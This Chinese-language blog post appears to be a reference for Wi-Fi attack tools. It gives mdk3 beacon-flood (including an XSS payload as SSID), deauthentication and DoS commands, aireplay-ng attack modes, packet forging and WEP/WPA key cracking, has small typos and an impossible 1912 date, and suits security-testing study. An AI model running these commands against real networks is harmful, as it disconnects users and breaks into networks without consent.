title: Aireplay-ng攻击模式详解
date: 1912-12
categories: [安全]
tags: [wifi,aircrack]
---


```
mdk3 wlan0monmon b -n "<script>alert(1);</script>" -w -g -m -s 15
```
mdk3 wlan0mon b
mdk3 wlan0mon d
iwconfig wlan1 txpower 33
mdk3 wlan0mon a -a 11:11:22:44:dd:00

<!--more-->
### mdk3
TEST MODES:
b   - Beacon Flood Mode
      Sends beacon frames to show fake APs at clients.
      This can sometimes crash network scanners and even drivers!
a   - Authentication DoS mode
      Sends authentication frames to all APs found in range.
      Too much clients freeze or reset some APs.
p   - Basic probing and ESSID Bruteforce mode
      Probes AP and check for answer, useful for checking if SSID has
      been correctly decloaked or if AP is in your adaptors sending range
      SSID Bruteforcing is also possible with this test mode.
d   - Deauthentication / Disassociation Amok Mode
      Kicks everybody found from AP
m   - Michael shutdown exploitation (TKIP)
      Cancels all traffic continuously
x   - 802.1X tests
w   - WIDS/WIPS Confusion
      Confuse/Abuse Intrusion Detection and Prevention Systems
f   - MAC filter bruteforce mode
      This test uses a list of known client MAC Adresses and tries to
      authenticate them to the given AP while dynamically changing
      its response timeout for best performance. It currently works only
      on APs who deny an open authentication request properly
g   - WPA Downgrade test
      deauthenticates Stations and APs sending WPA encrypted packets.
      With this test you can check if the sysadmin will try setting his
      network to WEP or disable encryption.
mdk3 --help <TEST MODES>
      -n <ssid> Use SSID <ssid> instead of randomly generated ones
      -f <filename> Read SSIDs from file
      -v <filename> Read MACs and SSIDs from file. See example file!
      -d Show station as Ad-Hoc
      -w Set WEP bit (Generates encrypted networks)
      -g Show station as 54 Mbit
      -t Show station using WPA TKIP encryption
      -a Show station using WPA AES encryption
      -m Use valid accesspoint MAC from OUI database
      -h Hop to channel where AP is spoofed
         This makes the test more effective against some devices/drivers
         But it reduces packet rate due to channel hopping.
      -c <chan> Fake an AP on channel <chan>. If you want your card to hop on
         this channel, you have to set -h option, too!
      -s <pps> Set speed in packets per second (Default: 50)

airbase-ng -P -C 500 -z 4 -c6 -i wlan0mon -F log wlan0mon
genpmk -f wordlist.txt -d pmkpre -s "WLAN"
airolib-ng PMKaircrack --import cowpatty  pmkpre
aircrack-ng -r PMKaircrak log.cap

### aircrack
-0 Deautenticate 冲突模式
使已经连接的合法客户端强制断开与路由端的连接，使其重新连接。在重新连接过程中获得验证数据包，从而产生有效 ARP request。
如果一个客户端连在路由端上，但是没有人上网以产生有效数据，此时，即使用-3 也无法产生有效 ARP request。所以此时需要用-0 攻击模式配合，-3 攻击才会被立刻激活。
aireplay-ng -0 10 –a <ap mac> -c <my mac> wifi0 参数说明：
【-0】：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）
【-a】：设置 ap 的 mac
【-c】：设置已连接的合法客户端的 mac。
如果不设置-c，则断开所有和 ap 连接的合法客户端。
aireplay-ng -3 -b <ap mac> -h <my mac> wifi0
注：使用此攻击模式的前提是必须有通过认证的合法的客户端连接到路由器
-1 fakeauth count 伪装客户端连接
这种模式是伪装一个客户端和 AP 进行连接。
这步是无客户端的研究学习的第一步，因为是无合法连接的客户端，因此需要一个伪装客户端来和路由器相连。为让 AP 接受数据包，必须使自己的网卡和 AP 关联。如果没有关联的话，目标 AP 将忽略所有从你网卡发送的数据包，IVS 数据将不会产生。
用-1 伪装客户端成功连接以后才能发送注入命令，让路由器接受到注入命令后才可反馈数据从而产生 ARP 包。
aireplay-ng -1 0 –e <ap essid> -a <ap mac> -h <my mac> wifi0
参数说明：
【-1】：伪装客户端连接模式，后面跟延时
【-e】：设置 ap 的 essid
【-a】：设置 ap 的 mac
【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）
-2 Interactive 交互模式
这种攻击模式是一个抓包和提数据发攻击包，三种集合一起的模式
1．这种模式主要用于研究学习无客户端，先用-1 建立虚假客户端连接然后直接发包攻击 ,
	aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b <ap mac> -h <my mac> wifi0
	参数说明：
	【-2】：交互攻击模式
	【-p】：设置控制帧中包含的信息（16 进制），默认采用 0841
	【-c】：设置目标 mac 地址
	【-b】：设置 ap 的 mac 地址
	【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）
	2．提取包，发送注入数据包 aireplay-ng -2 –r <file> -x 1024 wifi0 发包攻击.其中，-x 1024 是限定发包速度，避免网卡死机，可以选择 1024。
	-3 ARP-request 注入攻击模式
	这种模式是一种抓包后分析重发的过程 这种攻击模式很有效。既可以利用合法客户端，也可以配合-1 利用虚拟连接的伪装客户端。如果有合法客户端那一般需要等几分钟，让合法客户端和 ap 之间通信，少量数据就可产生有效 ARP request 才可利用-3模式注入成功。如果没有任何通信存在，不能得到 ARP request.，则这种攻击就会失败。
	如果合法客户端和ap之间长时间内没有 ARP request，可以尝试同时使用-0 攻击. 如果没有合法客户端，则可以利用-1 建立虚拟连接的伪装客户端，连接过程中获得验证数据包，从而产生有效 ARP request。再通过-3 模式注入。
	aireplay-ng -3 -b <ap mac> -h <my mac> -x 512 wifi0
	参数说明：
	【-3】：arp 注入攻击模式
	【-b】：设置 ap 的 mac
	【-h】：设置
	【-x】：定义每秒发送数据户包的数量，但是最高不超过 1024，建议使用 512（也可不定义）
	-4 Chopchop 攻击模式
	用以获得一个包含密钥数据的 xor 文件 这种模式主要是获得一个可利用包含密钥数据的 xor 文件，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。
	aireplay-ng -4 -b <ap mac> -h <my mac> wifi0 参数说明：
	【-b】：设置需要研究学习的 AP 的 mac
	【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）
	-5 fragment 碎片包攻击模式
	用以获得 PRGA(包含密钥的后缀为 xor 的文件) 这种模式主要是获得一个可利用 PRGA，这里的 PRGA 并不是 wep key 数据，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。其工作原理就是使目标 AP 重新广播包，当 AP 重广播时，一个新的 IVS 将产生，我们就是利用这个来研究学习 !
	aireplay-ng -5 -b <ap mac> -h <my mac> wifi0
	【-5】：碎片包攻击模式
	【-b】：设置 ap 的 mac
	【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）
	Packetforge-ng：数据包制造程序 Packetforge-ng <mode> <options>Mode
	【-0】：伪造 ARP 包
	packetforge-ng -0 -a <ap mac> -h <my mac> wifi0 –k 255.255.255.255 -l 255.255.255.255–y<.xor file> -w mrarp
	参数说明：
	【-0】：伪装 arp 数据包
	【-a】：设置 ap 的 mac
	【-h】设置虚拟伪装连接的 mac（即自己的 mac）
	【-k】<ip[:port]>说明：设置目标文件 IP 和端口
	【-l】<ip[:port]>说明：设置源文件 IP 和端口
	【-y】<file>说明：从 xor 文件中读取 PRGA。后面跟 xor 的文件名。
	【-w】设置伪装的 arp 包的文件名 Aircrack-ng：WEP 及 WPA-PSK key 研究学习主程序
	Aircrack-ng [optin] <.cap/.ivs file>Optin aircrack-ng -n 64 -b <ap mac> name-01.ivs )
	参数说明：
	【-n】：设置 WEP KEY 长度（64/128/152/256/512）aircrack-ng -x -f 2 name-01h.cap
	参数说明：
	【-x】：设置为暴力研究学习模式
	【-f】：设置复杂程度，wep 密码设置为 1，wpa 密码设置为 2 aircrack-ng -w password.txt ciw.cap
	【-w】：设置为字典研究学习模式，后面跟字典文件，再后面跟是我们即时保存的那个捕获到 WPA 验证的抓包文件。
